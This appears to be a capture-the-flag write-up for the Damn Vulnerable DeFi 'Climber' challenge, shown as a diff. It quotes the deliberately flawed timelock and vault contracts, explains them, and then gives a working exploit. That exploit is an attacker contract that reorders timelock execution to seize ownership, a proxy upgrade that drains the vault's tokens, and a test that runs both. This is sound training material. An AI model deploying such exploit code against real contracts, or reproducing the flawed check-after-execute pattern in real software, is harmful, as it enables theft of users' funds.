@@ -1,0 +1,433 @@
+#+AUTHOR: Francesco Cannarozzo
+* Climber
+** Statement
+** Files
+*** ClimberTimelock.sol
+**** Code
+     #+BEGIN_SRC solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/access/AccessControl.sol";
+import "@openzeppelin/contracts/utils/Address.sol";
+
+/**
+ * @title ClimberTimelock
+ * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ */
+contract ClimberTimelock is AccessControl {
+    using Address for address;
+
+    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
+    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
+
+    // Possible states for an operation in this timelock contract
+    enum OperationState {
+        Unknown,
+        Scheduled,
+        ReadyForExecution,
+        Executed
+    }
+
+    // Operation data tracked in this contract
+    struct Operation {
+        uint64 readyAtTimestamp;   // timestamp at which the operation will be ready for execution
+        bool known;         // whether the operation is registered in the timelock
+        bool executed;      // whether the operation has been executed
+    }
+
+    // Operations are tracked by their bytes32 identifier
+    mapping(bytes32 => Operation) public operations;
+
+    uint64 public delay = 1 hours;
+
+    constructor(
+        address admin,
+        address proposer
+    ) {
+        _setRoleAdmin(ADMIN_ROLE, ADMIN_ROLE);
+        _setRoleAdmin(PROPOSER_ROLE, ADMIN_ROLE);
+
+        // deployer + self administration
+        _setupRole(ADMIN_ROLE, admin);
+        _setupRole(ADMIN_ROLE, address(this));
+
+        _setupRole(PROPOSER_ROLE, proposer);
+    }
+
+    function getOperationState(bytes32 id) public view returns (OperationState) {
+        Operation memory op = operations[id];
+        
+        if(op.executed) {
+            return OperationState.Executed;
+        } else if(op.readyAtTimestamp >= block.timestamp) {
+            return OperationState.ReadyForExecution;
+        } else if(op.readyAtTimestamp > 0) {
+            return OperationState.Scheduled;
+        } else {
+            return OperationState.Unknown;
+        }
+    }
+
+    function getOperationId(
+        address[] calldata targets,
+        uint256[] calldata values,
+        bytes[] calldata dataElements,
+        bytes32 salt
+    ) public pure returns (bytes32) {
+        return keccak256(abi.encode(targets, values, dataElements, salt));
+    }
+
+    function schedule(
+        address[] calldata targets,
+        uint256[] calldata values,
+        bytes[] calldata dataElements,
+        bytes32 salt
+    ) external onlyRole(PROPOSER_ROLE) {
+        require(targets.length > 0 && targets.length < 256);
+        require(targets.length == values.length);
+        require(targets.length == dataElements.length);
+
+        bytes32 id = getOperationId(targets, values, dataElements, salt);
+        require(getOperationState(id) == OperationState.Unknown, "Operation already known");
+        
+        operations[id].readyAtTimestamp = uint64(block.timestamp) + delay;
+        operations[id].known = true;
+    }
+
+    /** Anyone can execute what has been scheduled via `schedule` */
+    function execute(
+        address[] calldata targets,
+        uint256[] calldata values,
+        bytes[] calldata dataElements,
+        bytes32 salt
+    ) external payable {
+        require(targets.length > 0, "Must provide at least one target");
+        require(targets.length == values.length);
+        require(targets.length == dataElements.length);
+
+        bytes32 id = getOperationId(targets, values, dataElements, salt);
+
+        for (uint8 i = 0; i < targets.length; i++) {
+            targets[i].functionCallWithValue(dataElements[i], values[i]);
+        }
+        
+        require(getOperationState(id) == OperationState.ReadyForExecution);
+        operations[id].executed = true;
+    }
+
+    function updateDelay(uint64 newDelay) external {
+        require(msg.sender == address(this), "Caller must be timelock itself");
+        require(newDelay <= 14 days, "Delay must be 14 days or less");
+        delay = newDelay;
+    }
+
+    receive() external payable {}
+}
+#+END_SRC
+**** Breakdown
+***** State
+      Two 32-byte constants are kept, *ADMIN_ROLE* and *PROPOSER_ROLE*, for the purpose of 
+      access control. Furthermore, a struct *Operation* is defined, and instances of such a structure
+      stored in a *bytes32 => Operation* mapping named *operations*. a variable *delay*, set to
+      1 hour, is also declared and initialized.
+***** Constructor
+      The constructor for this contract, taking two addresses for *admin* and *proposer*,
+      takes care of properly calling superclass methods from *AccessControl* to properly
+      set up the contract
+***** getOperationState
+      Given a *bytes32* /id/ for  an operation, returns a different element of contract-defined
+      enum *OperationState*, depending on the state of execution of the id'd operation.
+***** getOperationId
+      after passing in the same input required by *schedule()*, allows determination of its id.
+***** schedule
+      only callable by a sender with the *proposer* role, takes in an array of addresses /targets/,
+      one of uints, /value/, one of bytes, /dataElements/, and a single 32-byte value called /salt/.
+
+      After various requirements of *targets.length* are met, an id for the operation is computed
+      through the above function: if the operation is not yet known, *operation[id].readyAtTimestamp* is set to
+      current block timestamp plus the delay, and *operations[id].known* to true.
+***** execute
+      taking in the same input as above, and again making requirements on *targets.length*,
+      the operation's id is computed once again. Corresponding calls are then made, associating
+      the n-th target address with the n-th dataElement and the n-th value.
+      Finally, the operation state is required to be *ReadyForExecution* (doing so after calling functions is a bit odd)
+      and finally the operation's state is set to *executed*
+***** updateDelay
+      only callable by the contract itself, allows changing *delay*.
+*** ClimberVault.sol
+**** Code
+     #+BEGIN_SRC solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
+import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
+import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+import "./ClimberTimelock.sol";
+
+/**
+ * @title ClimberVault
+ * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner.
+ * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ */
+contract ClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
+
+    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
+    uint256 public constant WAITING_PERIOD = 15 days;
+
+    uint256 private _lastWithdrawalTimestamp;
+    address private _sweeper;
+
+    modifier onlySweeper() {
+        require(msg.sender == _sweeper, "Caller must be sweeper");
+        _;
+    }
+
+    /// @custom:oz-upgrades-unsafe-allow constructor
+    constructor() initializer {}
+
+    function initialize(address admin, address proposer, address sweeper) initializer external {
+        // Initialize inheritance chain
+        __Ownable_init();
+        __UUPSUpgradeable_init();
+
+        // Deploy timelock and transfer ownership to it
+        transferOwnership(address(new ClimberTimelock(admin, proposer)));
+
+        _setSweeper(sweeper);
+        _setLastWithdrawal(block.timestamp);
+        _lastWithdrawalTimestamp = block.timestamp;
+    }
+
+    // Allows the owner to send a limited amount of tokens to a recipient every now and then
+    function withdraw(address tokenAddress, address recipient, uint256 amount) external onlyOwner {
+        require(amount <= WITHDRAWAL_LIMIT, "Withdrawing too much");
+        require(block.timestamp > _lastWithdrawalTimestamp + WAITING_PERIOD, "Try later");
+        
+        _setLastWithdrawal(block.timestamp);
+
+        IERC20 token = IERC20(tokenAddress);
+        require(token.transfer(recipient, amount), "Transfer failed");
+    }
+
+    // Allows trusted sweeper account to retrieve any tokens
+    function sweepFunds(address tokenAddress) external onlySweeper {
+        IERC20 token = IERC20(tokenAddress);
+        require(token.transfer(_sweeper, token.balanceOf(address(this))), "Transfer failed");
+    }
+
+    function getSweeper() external view returns (address) {
+        return _sweeper;
+    }
+
+    function _setSweeper(address newSweeper) internal {
+        _sweeper = newSweeper;
+    }
+
+    function getLastWithdrawalTimestamp() external view returns (uint256) {
+        return _lastWithdrawalTimestamp;
+    }
+
+    function _setLastWithdrawal(uint256 timestamp) internal {
+        _lastWithdrawalTimestamp = timestamp;
+    }
+
+    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
+    function _authorizeUpgrade(address newImplementation) internal onlyOwner override {}
+}
+#+END_SRC
+**** Breakdown
+***** State
+      as the contract constrains trasfer by the owner in both amount and time,
+      constants *WITHDRAWAL_LIMIT* and *WAITING_PERIOD* are kept.
+      to keep track of time, integer *_lastWithdrawalTimestamp* is maintained.
+      an address *sweeper* is also maintained.
+***** constructor
+      an empty constructor is kept, with the *initializer* modifier from *Initializable* superclass.
+***** initialize
+      with an empty constructor, it's a call to this function that sets up the contract.
+      First, superclasses  *Ownable* and *UUPSUpgradeable*'s initializer methods are called;
+      following, ownership is transfered to a newly instantiated *ClimberTimelock* contract,
+      passing down *admin* and *proposer*. the sweeper is then set to the one provided as parameter,
+      using *_setSweeper()*. Finally, *_lastWithdrawalTimetsamp* is set to current block's,
+      both via *_setLastWithdrawal* and directly. A little redundant?
+***** withdraw
+      Allows owner to withdraw an *amount* of the token at *tokenAddress*, in favor of *recipient*.
+      after requiring both time and amount constraints to be met,
+      *_setLastWithdrawal()* is called with current timestamp;
+      finally, the transfer is required to go through.
+***** sweepFunds
+      only callable by Sweeper, sends them _ALL_ the tokens at *tokenAddress* belonging
+      to the contract. Definitely a good target.
+***** getSweeper
+      returns _sweeper.
+***** _setSweeper
+      internal, sets *_sweeper* to provided *newSweeper*.
+***** getLastWithdrawalTimestamp
+      returns _lastWithdrawalTimestamp.
+***** _setLastWithdrawal
+      sets *_lastWithdrawalTimestamp* to provided *timestamp*
+***** _authorizeUpgrade
+      overrides UUPSUpgradeable's function with modifier *onlyOwner*, making it only callable by
+      the owner (at initialization, the *ClimberTimelock* contract.)
+** Exploit
+   as the *ClimberTimelock* contract is set to own *ClimberVault*, it represents a very alluring target:
+   by controlling it, not only we could access all of the vault's funds, but even change its implementation.
+   luckily for us, the way the contract manages operation is unsecure, for a few reasons:
+   - Anyone can call *execute()*
+   - scheduled actions affect the contract itself
+   - the check on *OperationState* is performed at the end, allowing us to modify contract state before it.
+
+     How, then, should contract state be modified? We can think of a few ways.
+
+   1. Time limits are a big nuisance. We would like to set *delay* to zero.
+   2. Our ultimate goal is stealing the vault's contents. Since we can impersonate timelock, which is the current owner, we want that ownership transferred to us.
+   3. since we need to call *timelock.schedule()* in order to pass the final requirement, we ought to make ourself proposers
+   4. finally, we ought to schedule everything properly.
+
+   we can thus craft an attacker contract, transferring vault ownership to *attacker*.
+
+   #+BEGIN_SRC solidity
+   pragma solidity ^0.8.0;
+
+import 'contracts/climber/ClimberTimelock.sol';
+import 'contracts/climber/ClimberVault.sol';
+
+contract ClimberAttacker{
+    address[] targets;
+    uint256[] values;
+    bytes[] dataElements; //functions
+    ClimberTimelock timeLock;
+    ClimberVault vault;
+    bytes32 constant salt = keccak256("sale e non fa male");
+
+    constructor( address payable _timeLock, address _vault) {
+        vault = ClimberVault(_vault);
+        timeLock = ClimberTimelock(_timeLock);
+    }
+
+    function _makeProposer() internal {
+        targets.push(address(timeLock));
+        values.push(0);
+        dataElements.push(
+            abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this))
+        );
+    }
+
+    function _zeroDelay() internal {
+        targets.push(address(timeLock));
+        values.push(0);
+        dataElements.push(
+            abi.encodeWithSignature("updateDelay(uint64)", uint64(0))
+        );
+    }
+
+    function _stealVault(address newOwner) internal {
+        targets.push(address(vault));
+        values.push(0);
+        dataElements.push(
+            abi.encodeWithSignature("transferOwnership(address)", newOwner)
+        );
+
+    }
+    //call this last
+    function _doSchedule() internal  {
+        targets.push(address(this));
+        values.push(0);
+        dataElements.push(abi.encodeWithSignature("schedule()"));
+
+
+
+    }
+
+    function schedule() public {
+        timeLock.schedule(targets, values, dataElements, salt);
+    }
+
+
+    function attack() external {
+        _zeroDelay();
+        _makeProposer();
+        _stealVault(msg.sender);
+        _doSchedule();
+        timeLock.execute(targets, values, dataElements, salt);
+    }
+}
+   #+END_SRC
+
+   this is still not enough. While now *attacker* is the owner of vault, it is not the sweeper.
+   sadly, as *_setSweeper()* is an internal function only called upon initialization, there
+   would be no way for us to change the sweeper without changing the contract's implementation.
+   
+   good thing, then, that we can do just that.
+
+   we can craft a malicious vault upgrade, as a contract implementing the very same superclasses,
+   but redefining  *sweepFunds()* as an *ownerOnly* function. then we can, well, sweep.
+
+   #+BEGIN_SRC solidity
+   pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
+import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
+import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+
+contract TotallyNotMaliciousUpgrade is Initializable, OwnableUpgradeable, UUPSUpgradeable {
+
+
+    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
+    uint256 public constant WAITING_PERIOD = 15 days;
+
+    uint256 private _lastWithdrawalTimestamp;
+    address private _sweeper; //must keep even if unused
+
+
+
+    /// @custom:oz-upgrades-unsafe-allow constructor
+    constructor() initializer {}
+
+    function initialize() initializer external {
+        // Initialize inheritance chain
+        __Ownable_init();
+        __UUPSUpgradeable_init();
+
+    }
+
+    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
+    function _authorizeUpgrade(address newImplementation) internal onlyOwner override {}
+
+
+
+        function sweepFunds(address tokenAddress) external  onlyOwner {
+        IERC20 token = IERC20(tokenAddress);
+        require(token.transfer(msg.sender, token.balanceOf(address(this))), "Transfer failed");
+    }
+
+}
+   #+END_SRC
+   
+   finally, we run the exploit.
+
+   #+BEGIN_SRC javascript
+    it('Exploit', async function () {        
+        const attackerFactory = await ethers.getContractFactory('ClimberAttacker', attacker);
+        const attackerContract = await attackerFactory.deploy(this.timelock.address, this.vault.address);
+        await attackerContract.connect(attacker).attack();
+
+        const TotallyNotMaliciousUpgradeFactory = await ethers.getContractFactory('TotallyNotMaliciousUpgrade', attacker);
+
+        const TotallyNotMaliciouslyUpgradedVault = await upgrades.upgradeProxy(
+            this.vault.address,
+            TotallyNotMaliciousUpgradeFactory
+        )
+
+        await TotallyNotMaliciouslyUpgradedVault.connect(attacker).sweepFunds(this.token.address);
+    });
+   #+END_SRC
+   
+   
+   
